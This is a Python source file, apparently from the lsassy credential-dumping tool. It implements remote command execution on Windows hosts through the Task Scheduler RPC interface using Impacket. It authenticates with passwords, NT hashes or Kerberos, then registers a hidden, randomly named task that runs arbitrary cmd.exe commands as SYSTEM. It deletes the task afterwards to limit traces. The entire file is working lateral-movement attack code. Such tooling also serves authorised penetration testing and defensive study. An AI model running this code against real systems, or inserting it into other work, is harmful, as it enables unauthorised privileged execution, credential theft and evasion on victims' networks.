import logging
import random
import string
import time

from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from lsassy.exec.iexec import IExec


class Exec(IExec):
    """
    Remote execution using task creation as SYSTEM

    This execution method provides debug privilege
    """
    debug_privilege = True

    def __init__(self, session):
        super().__init__(session)
        self._rpctransport = None

    def exec(self, command):
        super().exec(command)
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % self.session.address
        self._rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self._rpctransport, 'set_credentials'):
            self._rpctransport.set_credentials(self.session.username, self.session.password, self.session.domain,
                                               self.session.lmhash, self.session.nthash, self.session.aesKey)
            self._rpctransport.set_kerberos(self.session.kerberos, self.session.dc_ip)
        dce = self._rpctransport.get_dce_rpc()

        dce.set_credentials(*self._rpctransport.get_credentials())
        if self.session.kerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        xml = self.gen_xml(command)
        tmpName = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        logging.debug("Register random task {}".format(tmpName))
        tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, '\\%s' % tmpName)
        done = False
        while not done:
            resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)

        time.sleep(3)
        tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
        dce.disconnect()

    def gen_xml(self, command):

        return """<?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <Triggers>
        <TimeTrigger>
          <StartBoundary>1989-09-17T02:20:00</StartBoundary>
          <Enabled>true</Enabled>
        </TimeTrigger>
      </Triggers>
      <Principals>
        <Principal id="LocalSystem">
          <UserId>S-1-5-18</UserId>
          <RunLevel>HighestAvailable</RunLevel>
        </Principal>
      </Principals>
      <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
          <StopOnIdleEnd>true</StopOnIdleEnd>
          <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>true</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
        <Priority>7</Priority>
      </Settings>
      <Actions Context="LocalSystem">
        <Exec>
          <Command>cmd.exe</Command>
          <Arguments>/C {}</Arguments>
         </Exec>
      </Actions>
    </Task>
    """.format(command)